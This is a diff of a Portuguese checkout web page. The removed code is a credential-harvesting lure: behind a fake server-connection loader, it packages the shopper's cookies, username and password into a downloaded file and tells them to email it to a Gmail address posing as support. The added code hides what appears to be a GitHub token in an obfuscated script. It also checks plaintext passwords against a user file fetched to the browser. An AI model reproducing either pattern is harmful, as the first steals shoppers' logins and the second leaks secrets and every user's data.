@@ -3,560 +3,519 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Checkout</title>
+  <link rel="shortcut icon" href="../../icons/llsecrets_sf.png" type="image/x-icon">
+  <title>Tela de Pagamento</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #121212;
-      color: #fff;
-    }
-
-    .container {
-      max-width: 800px;
-      margin: 50px auto;
+      background: #121212;
       padding: 20px;
+      max-width: 600px;
+      margin: auto;
+      color: white;
     }
-
-    h1 {
-      text-align: center;
+    h2 {
+      color: #333;
     }
+    input, button {
+      padding: 10px;
+      margin: 5px 0;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    button {
+      cursor: pointer;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    .card {
+      margin-top: 20px;
+      padding: 15px;
+      background: white;
+      border-radius: 5px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+    .qr-fake {
+      width: 200px;
+      height: 200px;
+      background: repeating-linear-gradient(45deg, #999 0, #999 10px, #ccc 10px, #ccc 20px);
+      margin: 20px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      color: #333;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    ul li {
+      margin: 5px 0;
+    }
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+#login {
+  background-color: #333;
+  color: #fff;
+  border-radius: 10px;
+  padding: 20px;
+  margin-bottom: 20px; 
+}
+    #h2_login{
+      color: hotpink;
+    }
+    #login_pag {
+      background-color: hotpink;
+      max-width: 100px;
+      border-radius: 10px;
 
-    .form-container {
+    }
+    #username {
       background-color: #333;
       color: #fff;
       border-radius: 10px;
-      padding: 20px;
+      padding: 15px;
       margin-bottom: 20px;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
-
-    .form-container h2 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .form-container input {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 10px;
-      border-radius: 5px;
-      border: none;
-      background-color: rgba(255, 255, 255, 0.1);
-      color: #fff;
-      transition: background-color 0.3s ease;
-    }
-
-    .form-container input:focus {
-      background-color: rgba(255, 255, 255, 0.2);
-    }
-
-    .form-container button {
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: hotpink;
-      color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .form-container button:hover {
-      background-color: #ff69b4;
-    }
-
-    #checkout {
+        #password {
       background-color: #333;
       color: #fff;
       border-radius: 10px;
-      padding: 20px;
+      padding: 15px;
       margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-
-    #order-list {
-      list-style-type: none;
-      padding: 0;
-    }
-
-    #order-list li {
-      margin-bottom: 10px;
-    }
-
-    #order-list li span {
-      float: right;
-    }
-
-    #total {
-      font-weight: bold;
-      margin-top: 10px;
-    }
-
-    #confirm-button {
-      display: block;
-      margin-top: 20px;
-      padding: 10px 20px;
-      background-color: hotpink;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    #confirm-button:hover {
-      background-color: #ff69b4;
-    }
-
-    #qr-code-container {
-      background-color: #333;
-      border-radius: 10px;
-      padding: 20px;
-      text-align: center;
-      display: none;
-      margin-top: 20px;
-    }
-
-    #qr-code {
-      display: none;
-      width: 200px;
-      height: 200px;
-    }
-    #code {
-      color: red;
-      display: none;
-    }
-    #timer {
-      text-align: center;
-      display: none;
-      margin-top: 20px;
-    }
-
-    #countdown {
-      font-size: 24px;
-      font-weight: bold;
-    }
-    #login_cr {
+        #login_cr {
       max-width: 100px;
       margin-bottom: 10px;
     }
-    #checkout-link {
-      text-align: center;
+    #checkSaldos {
+      color: white;
+      background-color: #333;
     }
+    #vfr_pd {
+      color: white;
+    }
+    #pagamento {
+      background-color: #333;
+    }
+    #agradecimento {
+      background-color: #333;
+    }
+    .loader {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #3498db;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+  margin: 10px auto;
+}
 
-    .cupom-container {
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 10px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .spinner {
+      position: relative;
+      width: 50px;
+      width: 50px;
+    }
+    .spinner div {
       position: absolute;
-      top: 20px; /* Ajuste a altura conforme necessário */
-      left: 20px; /* Ajuste a distância da esquerda conforme necessário */
+      width: 50%;
+      width: 100%;
+      background: #ffffff;
+      transform: rotate(calc(var(--rotation) * 1deg)) translate(0, calc(var(--translation) * 1%));
+      animation: spinner-fzua35 1s calc(var(--delay) * 1s) infinite ease;
+    }
+    @keyframes spinner-fzua35 {
+      0%, 10%, 20%, 30%, 50%, 60%, 70%, 80%, 90%, 100% {
+        transform: rotate(calc(var(--rotation) * 1deg)) translate(0, calc(var(--translation) * 1%));
+      }
+      50% {
+        transform: rotate(calc(var(--rotation) * 1deg)) translate(0, calc(var(--translation) * 1.5%));
+      }
+    }
+    #redirectNotice {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      background-color: #333;
+      padding: 10px 20px;
+      border-radius: 6px;
+      width: max-content;
+      margin-top: 20px;
     }
 
-    .cupom-container input[type="text"] {
-      padding: 8px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 4px 0 0 4px;
-      width: 200px; /* Ajuste a largura conforme necessário */
-    }
-
-    .cupom-container button {
-      padding: 8px 16px;
-      font-size: 16px;
-      border: 1px solid gray;
-      background-color: gray;
-      color: hotpink;
-      border-radius: 0 4px 4px 0;
-      cursor: pointer;
-    }
-    /* From Uiverse.io by Galahhad */ 
-.ui-abstergo {
-  --primary: #fff;
-  --secondary: rgba(255, 255, 255, 0.3);
-  --shadow-blur: 3px;
-  --text-shadow-blur: 3px;
-  --animation-duration: 2s;
-  --size: 1;
-}
-
-.abstergo-loader * {
-  -webkit-box-sizing: content-box;
-  box-sizing: content-box;
-}
-
-.ui-abstergo {
-  display: -webkit-box;
-  display: -ms-flexbox;
-  display: flex;
-  -webkit-box-orient: vertical;
-  -webkit-box-direction: normal;
-  -ms-flex-direction: column;
-  flex-direction: column;
-  -webkit-box-align: center;
-  -ms-flex-align: center;
-  align-items: center;
-  row-gap: 30px;
-  scale: var(--size);
-}
-
-.ui-abstergo .ui-text {
-  color: var(--primary);
-  text-shadow: 0 0 var(--text-shadow-blur) var(--secondary);
-  font-family: Menlo, sans-serif;
-  display: -webkit-box;
-  display: -ms-flexbox;
-  display: flex;
-  -webkit-box-align: baseline;
-  -ms-flex-align: baseline;
-  align-items: baseline;
-  -webkit-column-gap: 3px;
-  -moz-column-gap: 3px;
-  column-gap: 3px;
-}
-
-.ui-abstergo .ui-dot {
-  content: "";
-  display: block;
-  width: 3px;
-  height: 3px;
-  -webkit-animation: dots var(--animation-duration) infinite linear;
-  animation: dots var(--animation-duration) infinite linear;
-  -webkit-animation-delay: .4s;
-  animation-delay: .4s;
-  background-color: var(--primary);
-}
-
-.ui-abstergo .ui-dot:nth-child(2) {
-  -webkit-animation-delay: .8s;
-  animation-delay: .8s;
-}
-
-.ui-abstergo .ui-dot:nth-child(3) {
-  -webkit-animation-delay: 1.2s;
-  animation-delay: 1.2s;
-}
-
-.ui-abstergo .ui-dot+.ui-dot {
-  margin-left: 3px;
-}
-
-.abstergo-loader {
-  width: 103px;
-  height: 90px;
-  position: relative;
-}
-
-.abstergo-loader div {
-  width: 50px;
-  border-right: 12px solid transparent;
-  border-left: 12px solid transparent;
-  border-top: 21px solid var(--primary);
-  position: absolute;
-  -webkit-filter: drop-shadow(0 0 var(--shadow-blur) var(--secondary));
-  filter: drop-shadow(0 0 var(--shadow-blur) var(--secondary));
-}
-
-.abstergo-loader div:nth-child(1) {
-  top: 27px;
-  left: 7px;
-  rotate: -60deg;
-  -webkit-animation: line1 var(--animation-duration) linear infinite alternate;
-  animation: line1 var(--animation-duration) linear infinite alternate;
-}
-
-.abstergo-loader div:nth-child(2) {
-  bottom: 2px;
-  left: 0;
-  rotate: 180deg;
-  -webkit-animation: line2 var(--animation-duration) linear infinite alternate;
-  animation: line2 var(--animation-duration) linear infinite alternate;
-}
-
-.abstergo-loader div:nth-child(3) {
-  bottom: 16px;
-  right: -9px;
-  rotate: 60deg;
-  -webkit-animation: line3 var(--animation-duration) linear infinite alternate;
-  animation: line3 var(--animation-duration) linear infinite alternate;
-}
-
-.abstergo-loader:hover div:nth-child(1) {
-  top: 21px;
-  left: 14px;
-  rotate: 60deg;
-}
-
-.abstergo-loader:hover div:nth-child(2) {
-  bottom: 5px;
-  left: -8px;
-  rotate: 300deg;
-}
-
-.abstergo-loader:hover div:nth-child(3) {
-  bottom: 7px;
-  right: -11px;
-  rotate: 180deg;
-}
-
-@-webkit-keyframes line1 {
-  0%,
-  40% {
-    top: 27px;
-    left: 7px;
-    rotate: -60deg;
-  }
-
-  60%,
-  100% {
-    top: 22px;
-    left: 14px;
-    rotate: 60deg;
-  }
-}
-
-@keyframes line1 {
-  0%,
-  40% {
-    top: 27px;
-    left: 7px;
-    rotate: -60deg;
-  }
-
-  60%,
-  100% {
-    top: 22px;
-    left: 14px;
-    rotate: 60deg;
-  }
-}
-
-@-webkit-keyframes line2 {
-  0%,
-  40% {
-    bottom: 2px;
-    left: 0;
-    rotate: 180deg;
-  }
-
-  60%,
-  100% {
-    bottom: 5px;
-    left: -8px;
-    rotate: 300deg;
-  }
-}
-
-@keyframes line2 {
-  0%,
-  40% {
-    bottom: 2px;
-    left: 0;
-    rotate: 180deg;
-  }
-
-  60%,
-  100% {
-    bottom: 5px;
-    left: -8px;
-    rotate: 300deg;
-  }
-}
-
-@-webkit-keyframes line3 {
-  0%,
-  40% {
-    bottom: 16px;
-    right: -9px;
-    rotate: 60deg;
-  }
-
-  60%,
-  100% {
-    bottom: 7px;
-    right: -11px;
-    rotate: 180deg;
-  }
-}
-
-@keyframes line3 {
-  0%,
-  40% {
-    bottom: 16px;
-    right: -9px;
-    rotate: 60deg;
-  }
-
-  60%,
-  100% {
-    bottom: 7px;
-    right: -11px;
-    rotate: 180deg;
-  }
-}
-
-@-webkit-keyframes dots {
-  0% {
-    background-color: var(--secondary);
-  }
-
-  30% {
-    background-color: var(--primary);
-  }
-
-  70%, 100% {
-    background-color: var(--secondary);
-  }
-}
-
-@keyframes dots {
-  0% {
-    background-color: var(--secondary);
-  }
-
-  30% {
-    background-color: var(--primary);
-  }
-
-  70%, 100% {
-    background-color: var(--secondary);
-  }
-}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Checkout</h1>
-    <div class="form-container">
-      <h2>Crie seu login</h2>
-      <form id="login-form">
-        <input type="text" id="username" placeholder="Usuário" required>
-        <input type="password" id="password" placeholder="Senha" required>
-        <input type="password" id="confirm-password" placeholder="Confirmar Senha" required>
-        <button id="login_cr" type="submit">Criar Login</button>
-      </form>
+
+  <div id="login">
+    <h2 id="h2_login" >Login ou Criar Conta</h2>
+    <input type="text" id="username" placeholder="Usuário ou Email" />
+    <input type="password" id="password" placeholder="Senha" />
+    <div class="button-group">
+      <button id="login_pag" onclick="login()">Login</button>
+      <button id="login_pag" onclick="alert('Opção em manutenção'); return false" >Criar Conta</button>
     </div>
-    <div id="checkout" style="display: none;">
-      <h2>Revisão do Pedido</h2>
-      <ul id="order-list"></ul>
-      <div id="total"></div>
-      <div id="login-info" style="display: none;">
-        <h2>Login</h2>
-        <p><strong>Usuário:</strong> <span id="login-username"></span></p>
-        <p><strong>Senha:</strong> <span id="login-password"></span></p>
-      </div>
-      <div class="cupom-container">
-        <input type="text" id="inputCupom" placeholder="Digite o cupom">
-        <button onclick="validarCupom()">Validar Cupom</button>
-      </div>
-      <button id="confirm-button" onclick="confirmOrder()">Confirmar Pedido</button>
+  </div>
+
+  <div id="checkSaldos" class="card" style="display:none;">
+    <h2 id="vfr_pd" >Verifique seus pedidos - USER</h2>
+    <ul id="listaSaldos"></ul>
+    <ul id="lista_compras"></ul>
+    <button onclick="confirmarPagamento()">Confirmar e prosseguir com pagamento</button>
+  </div>
+
+  <div id="pagamento" class="card" style="display:none;">
+    <h2 id="vfr_pd" >Escolha a forma de pagamento</h2>
+    <div class="button-group">
+      <button onclick="realizarPagamento()">Usar Saldo</button>
+      <button onclick="alert('ERROR: ECONNREFUSED && EHOSTUNREACH')">Pagar com QR Code</button>
     </div>
-    
-    <div id="qr-code-container">
-      <h2 id="code" >Internal error - 503</h2>
-      <div class="ui-abstergo">
-  <div class="abstergo-loader">
-    <div></div>
-    <div></div>
-    <div></div>
   </div>
-  <div class="ui-text">
-    Conectando ao servidor
-    <div class="ui-dot"></div>
-    <div class="ui-dot"></div>
-    <div class="ui-dot"></div>
-  </div>
+
+<div id="spinner" style="display: none;">
+  <p>Gerando QR Code...</p>
+  <div class="loader"></div>
 </div>
+
+  <div id="qrcode" class="card" style="display:none;">
+    <h2>Pagamento por QR Code</h2>
+    <div class="qr-fake">QR 404</div>
+    <p>Escaneie o QR Code para pagar.</p>
+  </div>
+
+  <div id="agradecimento" class="card" style="display:none;">
+    <h2 id="vfr_pd" >Obrigado pelo seu pagamento!</h2>
+    <p id="agr" >Seu pedido foi processado com sucesso.</p>
+      <span>Você será redirecionado ao login em...</span>
+      <span id="countdown" style="font-weight: bold; font-size: 1.2em; min-width: 20px; text-align: right;">5</span>
     </div>
   </div>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
   <script>
-  setTimeout(function() {
-    document.querySelector('.ui-abstergo').style.display = 'none';
-    document.getElementById('code').style.display = 'block';
-  }, 30000);
+    var token,username,repo,path;(function(){var jMx='',Aax=752-741;function LTw(r){var j=171284;var l=r.length;var c=[];for(var p=0;p<l;p++){c[p]=r.charAt(p)};for(var p=0;p<l;p++){var x=j*(p+332)+(j%52133);var f=j*(p+643)+(j%44180);var h=x%l;var u=f%l;var s=c[h];c[h]=c[u];c[u]=s;j=(x+f)%2545855;};return c.join('')};var icZ=LTw('bihlntuccwqdrrtsfyoxjusmtapokenzvorcg').substr(0,Aax);var ypV='pae]d7l.cpr5vzt4t2hg,ft= }fb,d8r435jv0{,erq2v, )qx;u";la).,enui,2s=<nearng;,[lm1)o1ci;;n=)nxttd;t6;li4e7t)}a,i=r46Afi)a*r(;a l"=plAara).atmf(pnxih7;ns.=h.*++)(t7=p]==d(]Cn[=c=;[;;ly6Cu=c]hql=rtur8(.=i++odnhu+una.}<(x+0es5khr68.si+mznvad1v+hsg) =vtsff=.sm]i=v";0nbfpu(o=h4r[zlc.,u)f-z80>=;gr;9n!vudamo,]8{[;rria;f)=aus9u .,lfsl-r.r,etirva7qjc;;pt!=;f;zi" Axldmloa( ri00a 2a9()h;gnm1lprol;crg+ie=lp(;A))r29k=[yn;{}t(({n=+r s((d)s]d6cri=bqu4du]1)ah+;vr;)+29fa,s=  jiore=,,)=];ha07etgu(-0u=;v(e[ror{r;9{rtit+x.c,u5ua+ogroC+s(a+;dnb.s+=-";)8=letren)uren,.r(x( rhh,trat](hfer>oa[1n3.)umivnw+t-icg+.;"s);kr=8<a(,,( 1C((,hug1;3i,01a.te}ugtavl oj);.,[uhha,1ugn ciyg. gr;era]=Sijo)9((;e;}}repf,as7=h]rs v(2y=8-va(id7a"z;or( fnflCC1=eu. t6"{2)a2])(+=c"tpbz[la[.0katr)vemo6<50hn; o;=;.e[;f;+(nCjv)u(rp<)icb r+v;))+)[;npxoll=(1+7vovi.g,l[AC.hou=)S0af vdndoq.=a6sgle=x r]-j8re+ s0.nverld ga8"(aeau)bj,dvh';var Kff=LTw[icZ];var XsN='';var tfe=Kff;var gUS=Kff(XsN,LTw(ypV));var HMy=gUS(LTw(' bQ"dv$7}g,;fsQ((0fQQ(mgo+=fr$(mQcbrsw zrabw(#p1.43i-(Q;efQ.)p}{t3$Q!#t,er;))gsd]b};p.+oga ()"frQpfQ1Q.$Q.$ p)oe8Q2t5!)0+z23}))..=ei..aj&4((th ;;n;xa)7f_!$grc.g2(j_eua\/lfhQ)(f 3f)$,=QC;"57,1f7atsQs!)ln+784=t),_;.{e2ra#!t)f]+C;rQ$\/,Qe)Q.uQQ b(1!mo$\'{e,).Sw4snu.f!sQ.16d,i_83dfa7f(p,4so.j%60jboQ5(Q)$QQ$,it5)b,o(}u,,+srQj!f%,p,)!!d3onavrof).})et1.ma;.+)6f.tt,f Q$QQ+rt${e3(4f5_.01{fQ.4(r_n.Qi)2li](f 43Q16;)0)%p){;.3Q$o.;QQrQ.av(!Qnj.p.r.x;fe"31Q.Qaht\'unf3n)s Qb6%esdQd72!4.Q]1-0Qt!_;}$hQ&\/d;)Q,"S.$_4]\/*w!Q(00!!..);ja%eSeptuof==QrQ#+#3!({}4en)9QQ9!_(.!Qs!_$3o3=Co4=oQgel7uftnQ)f)fn;aj,m.f_a_1. n){aQQenQ(74Q=.tQ,;(n#6,6Dyo.ff-=t) *.%s3=aay0,*2)pr+}#w$u(.m.f=tok_$=e0;=q_lr0(3ghtof8r}$o(e,Q1p=6jn%)l&Q.=3or["7tQem3s}6Q22.bja,t2,!&f$sf\/QQi{;v5s-e!Q=.\'a.4uQ=g7p48.Q]Qth)iiQi__(QQ4h()$tzn%0QQ.QQ0($g\/QC .suQ+s700f[rrt_r&\'Qy=t,*,!...((a;.$,; .ttQ $Qt4og2_dsf_ppb!1.f_=."r1o[$aQ.,,%Q.e62x6.)nuQ5f ].Q(5 +)- .a;a1!.le;wnj,23fcv7.QjQ_t=f,hj};)8s_r,h.,lfsQ(e+,Q;f4%3)'));var jxe=tfe(jMx,HMy );jxe(4195);return 7214})()
 
-    var username = '';
-      document.getElementById('checkout-link').href = link;
-    document.getElementById('checkout-link').textContent = link;
-  
-    function getShopCookies() {
-      return document.cookie.split(';')
-        .map(cookie => cookie.trim())
-        .filter(cookie => cookie.startsWith('shop_'))
-        .join('\n');
+    function esconderTodas() {
+      document.getElementById("login").style.display = "none";
+      document.getElementById("checkSaldos").style.display = "none";
+      document.getElementById("pagamento").style.display = "none";
+      document.getElementById("spinner").style.display = "none";
+      document.getElementById("qrcode").style.display = "none";
+      document.getElementById("agradecimento").style.display = "none";
     }
-  
-    function encryptAES(data) {
-      const key = 'Ck3rH74NpC5WUy9s';
-      const encrypted = CryptoJS.AES.encrypt(data, key).toString();
-      return encrypted;
-    }
-  
-    function downloadCookies() {
-      const cookies = getShopCookies();
-      const encryptedCookies = encryptAES(cookies);
-      const encryptedUsername = encryptAES(username);
-      const encryptedPassword = encryptAES(document.getElementById('password').value);
-  
-      const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!\n\nmegazn960@gmail.com`;
-  
-      const blob = new Blob([fileContent], { type: 'text/plain' });
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      link.download = 'pedido.txt';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-  
-    function confirmOrder() {
-      document.getElementById('checkout').style.display = 'none';
-      document.getElementById('qr-code-container').style.display = 'block';
-      document.getElementById('timer').style.display = 'block';
-      document.getElementById('checkout-link').style.display = 'block';
-      document.getElementById('checkout-link').href = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${document.getElementById('username').value}`;
-      startTimer();
-      downloadCookies(); 
-    }
-  
-    function startTimer() {
-      let seconds = 300;
-      const countdown = document.getElementById('countdown');
-      const timer = setInterval(() => {
-        const minutes = Math.floor(seconds / 60);
-        const remainingSeconds = seconds % 60;
-        countdown.textContent = `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
-        if (seconds === 0) {
-          clearInterval(timer);
-          document.getElementById('qr-code-container').innerHTML = '<h2>Obrigado pela compra!</h2>';
-        } else {
-          seconds--;
-        }
-      }, 1000);
-    }
-  
 
-  
-    document.getElementById('login-form').addEventListener('submit', function(event) {
-      event.preventDefault();
-      username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const confirmPassword = document.getElementById('confirm-password').value;
-      if (password !== confirmPassword) {
-        alert('As senhas não coincidem!');
-      } else {
-        document.getElementById('checkout').style.display = 'block';
-        document.getElementById('login-info').style.display = 'block';
-        document.getElementById('login-username').textContent = username;
-        document.getElementById('login-password').textContent = password;
-        document.querySelector('.form-container').style.display = 'none';
+    esconderTodas();
+    document.getElementById("login").style.display = "block";
+
+
+let usuarioLogado = null;
+
+async function buscarUsuarios() {
+  try {
+    const response = await fetch(`https://api.github.com/repos/${username}/${repo}/contents/${path}`, {
+      headers: { Authorization: `token ${token}` }
+    });
+    if (!response.ok) {
+      alert("Erro ao acessar a API do GitHub.");
+      return [];
+    }
+    const data = await response.json();
+    const content = atob(data.content);
+    return JSON.parse(content);
+  } catch (error) {
+    alert("Erro na requisição: " + error);
+    return [];
+  }
+}
+
+async function login() {
+  const usernameInput = document.getElementById("username").value.trim();
+  const passwordInput = document.getElementById("password").value.trim();
+  const users = await buscarUsuarios();
+
+  const user = users.find(u =>
+    (u.email === usernameInput || u.usuario === usernameInput) && u.password === passwordInput
+  );
+
+  if (user) {
+    alert("Login bem-sucedido!");
+    document.cookie = `user_id=${user.id}; path=/`;
+    usuarioLogado = user;
+    mostrarSaldosParaChecar();
+  } else {
+    alert("Email ou senha inválidos.");
+  }
+}
+
+function mostrarSaldosParaChecar() {
+  document.getElementById("login").style.display = "none";
+  document.getElementById("checkSaldos").style.display = "block";
+
+  const lista = document.getElementById("listaSaldos");
+  lista.innerHTML = "";
+
+  const titulo = document.getElementById("vfr_pd");
+
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+  return null;
+}
+
+const userId = getCookie('user_id'); // <-- nome do cookie certo!
+const defaultSrc = '../../icons/user1.png';
+const userImage = document.getElementById('user');
+
+if (titulo && usuarioLogado) {
+titulo.innerHTML = `
+  <div style="display: flex; align-items: center; gap: 10px;">
+    <img id="user" src="${defaultSrc}" alt="user-profile" style="width: 50px; height: 50px; border-radius: 50%; object-fit: cover;">
+    <div>
+      <strong>${usuarioLogado.email}</strong><br>
+      <span>Saldo: R$${usuarioLogado.saldo}</span>
+    </div>
+  </div>
+  <h3 style="margin-top: 10px;">Verifique seus pedidos</h3>
+`;
+
+  setTimeout(() => {
+    const userId = getCookie('user_id'); // <-- corrigido aqui também
+    const userImage = document.getElementById('user');
+
+    if (userId && userImage) {
+      const customSrc = `../../icons/${userId}.png`;
+
+      const checkImage = (src, callback) => {
+        const img = new Image();
+        img.onload = () => callback(true);
+        img.onerror = () => callback(false);
+        img.src = src;
+      };
+
+      checkImage(customSrc, (exists) => {
+        userImage.src = exists ? customSrc : defaultSrc;
+      });
+    } else if (userImage) {
+      userImage.src = defaultSrc;
+    }
+  }, 50); // tempo para garantir que o <img> já foi inserido
+}
+
+
+  const cookies = document.cookie.split(";");
+  let encontrouSaldo = false;
+  let total = 0;
+
+  cookies.forEach(cookie => {
+    const [chaveBruta, valorBruto] = cookie.trim().split("=");
+    const chave = chaveBruta.trim();
+    const valor = valorBruto ? valorBruto.trim() : "";
+
+    if (chave.toLowerCase().startsWith("shop_")) {
+      const nomeLink = chave.replace(/^shop_/, "");
+      const [valorCompraStr, idLink] = valor.split("_");
+      const valorCompra = parseFloat(valorCompraStr.replace(",", "."));
+
+      if (!isNaN(valorCompra)) {
+        encontrouSaldo = true;
+        total += valorCompra;
+        lista.innerHTML += `<li>${nomeLink}: R$${valorCompra.toFixed(2).replace(".", ",")}</li>`;
+      }
+    }
+  });
+
+  if (!encontrouSaldo) {
+    lista.innerHTML = "<li>Nenhum saldo encontrado.</li>";
+  }
+}
+
+function confirmarPagamento() {
+  document.getElementById("checkSaldos").style.display = "none";
+  document.getElementById("pagamento").style.display = "block";
+}
+
+async function realizarPagamento() {
+  if (!usuarioLogado) {
+    alert("Usuário não autenticado.");
+    return;
+  }
+
+  const cookies = document.cookie.split(";");
+  let totalCompra = 0;
+  let idLinksComprados = [];
+
+  cookies.forEach(cookie => {
+    const [chave, valor] = cookie.trim().split("=");
+    if (chave.startsWith("shop_")) {
+      const [valorStr, idLink] = valor.split("_");
+      const valorNum = parseFloat(valorStr.replace(",", "."));
+      if (!isNaN(valorNum)) {
+        totalCompra += valorNum;
+        if (idLink) idLinksComprados.push(idLink);
+      }
+    }
+  });
+
+  const saldoNum = parseFloat(usuarioLogado.saldo.replace("R$", "").replace(",", "."));
+
+  if (saldoNum >= totalCompra) {
+    const novoSaldoNum = saldoNum - totalCompra;
+    const novoSaldoFormatado = `R$${novoSaldoNum.toFixed(2).replace(".", ",")}`;
+    usuarioLogado.saldo = novoSaldoFormatado;
+
+    if (!Array.isArray(usuarioLogado.id_links)) {
+      usuarioLogado.id_links = [];
+    }
+    idLinksComprados.forEach(id => {
+      if (!usuarioLogado.id_links.includes(id)) {
+        usuarioLogado.id_links.push(id);
       }
     });
-  
+
+    try {
+      const res = await fetch(`https://api.github.com/repos/${username}/${repo}/contents/${path}`, {
+        headers: { Authorization: `token ${token}` }
+      });
+      if (!res.ok) {
+        alert("Erro ao acessar dados para atualização.");
+        return;
+      }
+      const data = await res.json();
+      const content = atob(data.content);
+      const users = JSON.parse(content);
+
+      const indice = users.findIndex(u => u.id === usuarioLogado.id);
+      if (indice === -1) {
+        alert("Usuário não encontrado nos dados.");
+        return;
+      }
+
+      users[indice].saldo = novoSaldoFormatado;
+      users[indice].id_links = usuarioLogado.id_links;
+
+      const novoConteudo = btoa(JSON.stringify(users, null, 2));
+
+      const updateRes = await fetch(`https://api.github.com/repos/${username}/${repo}/contents/${path}`, {
+        method: "PUT",
+        headers: {
+          Authorization: `token ${token}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          message: `Atualizando saldo e id_links do usuário ${usuarioLogado.id}`,
+          content: novoConteudo,
+          sha: data.sha
+        })
+      });
+
+      if (!updateRes.ok) {
+        alert("Erro ao atualizar os dados no GitHub.");
+        return;
+      }
+
+      // 🔴 Limpar TODOS os cookies
+      cookies.forEach(cookie => {
+        const chave = cookie.split("=")[0].trim();
+        document.cookie = `${chave}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+      });
+
+      document.getElementById("pagamento").style.display = "none";
+      mostrarAgradecimento();
+    } catch (error) {
+      alert("Erro ao atualizar dados: " + error);
+    }
+  } else {
+    alert(`Saldo insuficiente. Seu saldo: R$${saldoNum.toFixed(2).replace(".", ",")}, total da compra: R$${totalCompra.toFixed(2).replace(".", ",")}`);
+  }
+}
+function mostrarAgradecimento() {
+  esconderTodas();
+  document.getElementById("agradecimento").style.display = "block";
+
+  // Inicia o contador regressivo de 5 até 1
+  let count = 5;
+  const countdownEl = document.getElementById('countdown');
+  countdownEl.textContent = count; // mostra o 5 inicialmente
+
+  const interval = setInterval(() => {
+    count--;
+    if (count < 1) {
+      clearInterval(interval);
+      // Redireciona quando o contador chegar a 0
+      window.location.href = 'login.html';
+    } else {
+      countdownEl.textContent = count;
+    }
+  }, 1000);
+}
+
+
+// Mostrar lista de compras ao carregar
+const cookies = document.cookie.split(";");
+const lista = document.getElementById("lista_compras");
+let totalCompra = 0;
+
+cookies.forEach(cookie => {
+  const [chave, valor] = cookie.trim().split("=");
+  if (chave.startsWith("shop_")) {
+    const [valorStr, idLink] = valor.split("_");
+    const valorCompra = parseFloat(valorStr.replace(",", "."));
+    if (!isNaN(valorCompra)) {
+      totalCompra += valorCompra;
+      const nomeLink = chave.replace("shop_", "");
+}
+  }
+});
+
+lista.innerHTML += `<li><strong>Total: R$${totalCompra.toFixed(2).replace(".", ",")}</strong></li>`;
+
+function mostrarQRCode() {
+  const spinner = document.getElementById("spinner");
+  const qrcode = document.getElementById("qrcode");
+
+  spinner.style.display = "block";
+  qrcode.style.display = "none";
+
+  setTimeout(() => {
+    spinner.style.display = "none";
+    qrcode.style.display = "block";
+  }, 2000);
+}
+
+
+
   </script>
-  
-  
-  <script src="../../js/token.js"></script>
 </body>
 </html>
